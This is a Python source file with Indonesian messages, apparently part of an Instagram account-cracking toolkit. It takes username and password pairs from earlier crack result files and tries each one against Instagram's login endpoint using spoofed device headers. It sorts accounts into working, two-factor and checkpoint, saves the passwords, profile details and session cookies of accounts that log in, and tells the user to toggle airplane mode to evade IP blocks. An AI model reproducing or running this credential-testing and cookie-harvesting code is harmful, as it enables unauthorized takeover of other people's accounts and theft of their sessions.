try:
    import uuid, pytz, hmac, hashlib, urllib, shutil, base64
    import os, re, sys, json, time, random, datetime, requests
    from rich.tree import Tree
    from rich import print as printz
    from rich.panel import Panel
    from rich.console import Console
    from rich.columns import Columns
    from Temporary.Secure import Require
    from Temporary.Terminalize.Styles import style_terminal
except(Exception, KeyboardInterrupt) as e:
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
        exit()
    except(Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
        exit()

class Requ:
    def __init__(self) -> None:
        self.proxies = []
        self.MID = {}
        pass      
        
    def SetMid(self):
        return '' if len(self.MID) == 0 else random.choice(self.MID)
        
    def UseNet(self):
        return('MOBILE.LTE','MOBILE(LTE)')
        
    def Android_ID(self, username, password):
        self.xyz = hashlib.md5()
        self.xyz.update(username.encode('utf-8') + password.encode('utf-8'))
        self.hex = self.xyz.hexdigest()
        self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
        return self.xyz
        
    def HeadersApiLogin(self):
        return {
           'host': 'b.i.instagram.com',
           'x-ig-app-locale': 'in_ID',
           'x-ig-device-locale': 'in_ID',
           'x-ig-mapped-locale': 'id_ID',
           'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
           'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
           'x-ig-bandwidth-speed-kbps': '-1.000',
           'x-ig-bandwidth-totalbytes-b': '0',
           'x-ig-bandwidth-totaltime-ms': '0',
           'x-bloks-version-id': self.Blok_ID(),
           'x-ig-www-claim': '0',
           'x-bloks-is-prism-enabled': 'false',
           'x-bloks-is-layout-rtl': 'false',
           'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
           'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357',
           'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
           'x-ig-timezone-offset': str(self.timezone_offset()),
           'x-fb-connection-type': self.UseNet()[0],
           'x-ig-connection-type': self.UseNet()[1],
           'x-ig-capabilities': '3brTv10=',
           'x-ig-app-id': '567067343352427',
           'priority': 'u=3',
           'user-agent': 'Instagram 309.1.0.41.113 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 541635863)',
           'accept-language': 'id-ID, en-US',
           'x-mid': str(self.SetMid()),
           'ig-intended-user-id': '0',
           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'content-length': '2702',
           'x-fb-http-engine': 'Liger',
           'x-fb-client-ip': 'True',
           'x-fb-server-cluster': 'True'
       }
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('"user_id":"(\d+)"', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{"media_id":"(.*?)"',str(response))[0])
            except (Exception) as e: exit(e)
            
    def Facebook_Acc(self, cookie):
        with requests.Session() as r:
            try:
                self.csrftoken = re.findall('csrftoken=(.*?);',str(cookie))
                self.headers = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.csrftoken) == 0 else self.csrftoken[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie": cookie}
                response = r.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.headers).json()
                if 'fbAccount' in str(response):
                    self.nama = response['fbAccount']['display_name']
                    self.response2 = r.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cookie}).text
                    self.username = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.response2)).group(1)
                else:
                    self.nama = None
                    self.username = (None)
            except (Exception) as e:
                self.nama = 'Response Error'
                self.username = 'Response Error'
            return('%s|%s'%(self.username, self.nama))

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}).json()
               return (
                   response["data"]["user"]["full_name"], 
                   response["data"]["user"]["edge_followed_by"]["count"], 
                   response["data"]["user"]["edge_follow"]["count"], 
                   response["data"]["user"]["edge_owner_to_timeline_media"]["count"],
                   response["data"]["user"]["biography"],
                   response["data"]["user"]["is_private"],
                   response["data"]["user"]["is_verified"],
                   response["data"]["user"]["profile_pic_url"],
                   response["data"]["user"]["profile_pic_url_hd"],response["data"]["user"]["profile_pic_url_hd"]
               )
           except (Exception) as e: return(None,None,None,None,None,None,None,None,None,None)
           
    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())
        
    def Blok_ID(self):
        self.v23 = 'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'
        self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        return(random.choice([self.v09,self.v39,self.v23]))
       
    def timezone_offset(self):
        self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
        self.ofs = self.tim.utcoffset().total_seconds()/60/60
        return self.ofs    

class Detedtors:
    def __init__(self) -> None:
        self.ok = 'Detedtor-Ok.txt'
        self.cp = 'Detedtor-Cp.txt'
        self.fa = 'Detedtor-2f.txt'
        self.success, self.chekpoint, self.faktor, self.sandi_salah, self.looping = 0,0,0,0,0
        pass
        
    def Chekpoint(self):
        try: self.result_cp = os.listdir('/sdcard/CP')
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
        try:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[yellow]/Sdcard/CP/[grey50]'", title = f"[white]• [green] Success [white]•"))
            for file_cp in self.result_cp:
                Console().print(f'[yellow]•[grey50]. {str(file_cp)}')
            Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [yellow]CP-Instagram-24-September-2024 [grey50]Dan Gunakan Koma Sebagai Pemisah', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
            files = Console().input("[grey50]   ╰─> ")
            Console(width = 65, style = f"{style_terminal}").print(Panel(f'\
[grey50]Result OK tersimpan di : OK/OK-Instagram-{self.ok}\nResult 2F tersimpan di : 2F/2F-Instagram-{self.fa}\nResult Cp tersimpan di : CP/CP-Instagram-{self.cp}\n\
    - Mainkan Mode Pesawat 5 Detik Setiap 200 Loop -', title = f"[white]• [green]Save Result [white]•"))
            for eksekusi in files.split(','):
                for buka in open('/sdcard/CP/'+str(eksekusi)).readlines():
                    try:
                        username, password = buka.split('|')[1], buka.split('|')[2]
                        self.Username_And_Password(buka, username, password)
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Kamu Telah Mendapatkan [green]{self.success}[grey50] Hasil [green]Success[grey50], [red]{self.faktor}[grey50] Hasil [red]Two Faktor[grey50], [yellow]{self.chekpoint}[grey50] Hasil [yellow]Checkpoint[grey50] Dan [blue]{self.sandi_salah}[grey50] Hasil [blue]Password Salah[grey50], Semua Hasil Tersimpan Di Result!", title = "[white]• [green]Selesai [white]•"))
            exit()
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
                
    def Username_And_Password(self, dump, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]└──[[green]{str(username)[:15]}[grey50]][white] — [grey50][[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]][bold white] — [grey50][[bold white]Ok[grey50]:[green]{self.success}[grey50]/[white]2f[grey50]:[red]{self.faktor}[grey50]/[white]Cp[grey50]:[yellow]{self.chekpoint}[grey50]/Sh[grey50]:[yellow]{self.sandi_salah}[grey50]]", end='\r')
        try:
            ua_generate = ('Instagram 309.1.0.41.113 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 253447817)')
            signed_body = str(random.choice(["7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.","SIGNATURE."]))
            app_new = {'signed_body': f'{signed_body}'+str(json.dumps({'id': str(uuid.uuid4()), "server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_custom_transitions_universe,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_session_scoped_logger,ig_android_accoun_switch_badge_fix_universe,ig_android_smartlock_hints_universe,ig_android_black_out,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_android_direct_remove_view_mode_stickiness_universe,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"})),'ig_sig_key_version': '4'}
            curl = byps.get('https://www.instagram.com/web/__mid', data = app_new, allow_redirects=True)
            try: csrftoken = re.search('{"csrf_token":"(.*?)"', str(curl.text)).group(1)
            except: csrftoken = None
            headers = {
                'Host':'www.instagram.com',
                'x-ig-www-claim':'0',
                'x-instagram-ajax':'6543adcc6d29',
                'content-type':'application/x-www-form-urlencoded',
                'accept':'*/*',
                'x-requested-with':'XMLHttpRequest',
                'x-asbd-id':'198387',
                'user-agent':ua_generate,
                'x-csrftoken':csrftoken,
                'x-ig-app-id':'1217981644879628',
                'origin':'https://www.instagram.com',
                'sec-fetch-site':'same-origin',
                'sec-fetch-mode':'cors',
                'sec-fetch-dest':'empty',
                'referer':'https://www.instagram.com/accounts/login/',
                'accept-encoding':'gzip, deflate',
                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            }
            payload = {
                'username': username,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),password),
                'optIntoOneTap': False,
                'queryParams': '{}',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': {},
                'next': 'https://www.instagram.com/accounts/access_tool/logins'
            }
            response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, allow_redirects=True).text
            if 'userId' in str(response):
                self.success+=1
                try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                except (Exception) as e: cookie = (None)
                try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                except (UnboundLocalError) as e: pass
                tree = Tree('\r                                             ')
                tree = tree.add('╭ [italic green]Response Success')
                tree.add(f'[italic grey50]Username : [green]{username}')
                tree.add(f'[italic grey50]Fullname : [green]{fullname}')
                tree.add(f'[italic grey50]Password : [green]{password}')
                tree.add(f'[italic grey50]Profiles : [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                trua = tree.add('[italic green]Response Cookie')
                trua.add(f'[italic grey50]Cookie : [green]{cookie}')
                tree.add(f'[italic grey50]Useragent : [green]{headers["user-agent"]}')
                printz(tree)
                save = f'{fullname}|{username}|{password}|{follower}|{followed}|{feedpost}|{cookie}\n'    
                with open('/sdcard/OK/'+self.ok,'a') as wr:
                    wr.write(save)
                    wr.close()  
            elif 'two_factor_required' in response.replace('\\',''):
                try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                except (UnboundLocalError) as e: pass
                tree = Tree('\r                                             ')
                tree = tree.add('╭ [italic red]Response A2F')
                tree.add(f'[italic grey50]Username : [red]{username}')
                tree.add(f'[italic grey50]Fullname : [red]{fullname}')
                tree.add(f'[italic grey50]Password : [red]{password}')
                tree.add(f'[italic grey50]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
                tree.add(f'[italic grey50]Useragent : [red]{headers["user-agent"]}')
                printz(tree)
                save = f'{fullname}|{username}|{password}|{follower}|{followed}|{feedpost}\n'
                with open('/sdcard/2F/'+self.fa,'a') as wr:
                    wr.write(save)
                    wr.close() 
            elif 'challenge_required' in response.replace('\\',''):
                try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                except (UnboundLocalError) as e: pass
                tree = Tree('\r                                             ')
                tree = tree.add('╭ [italic yellow]Response Checkpoint')
                tree.add(f'[italic grey50]Username : [yellow]{username}')
                tree.add(f'[italic grey50]Fullname : [yellow]{fullname}')
                tree.add(f'[italic grey50]Password : [yellow]{password}')
                tree.add(f'[italic grey50]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
                tree.add(f'[italic grey50]Useragent : [yellow]{headers["user-agent"]}')
                printz(tree)
                save = f'{fullname}|{username}|{password}|{follower}|{followed}|{feedpost}\n'
                with open('/sdcard/CP/'+self.cp,'a') as wr:
                    wr.write(save)
                    wr.close()
            elif 'ip_block' in response.replace('\\',''):
                Console().print(f"[grey50]   ──>[red] HIDUPKAN MODE PESAWAT 5 DETIK!", end='\r')
                time.sleep(3.5)  
            elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(response):   
                Console().print(f"[grey50]   ──>[red] HIDUPKAN MODE PESAWAT 5 DETIK!", end='\r')
                time.sleep(3.5)  
            elif 'Kesalahan' in response.replace('\\',''):
                Console().print(f"[grey50]   ──>[red] HIDUPKAN MODE PESAWAT 5 DETIK!", end='\r')
                time.sleep(3.5)  
            elif 'Maaf, terdapat masalah pada permintaan Anda.' in response.replace('\\',''):
                Console().print(f"[grey50]   ──>[red] HIDUPKAN MODE PESAWAT 5 DETIK!", end='\r')
                time.sleep(3.5)
            else:
                Console().print(f"[grey50]   ──>[red] KATA SANDI SALAH!", end='\r')
                time.sleep(3.5) 
                self.sandi_salah+=1
        except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[bold grey50]   ──>[bold red] KONEKSI ERROR!", end='\r'); time.sleep(31)
        self.looping+=1 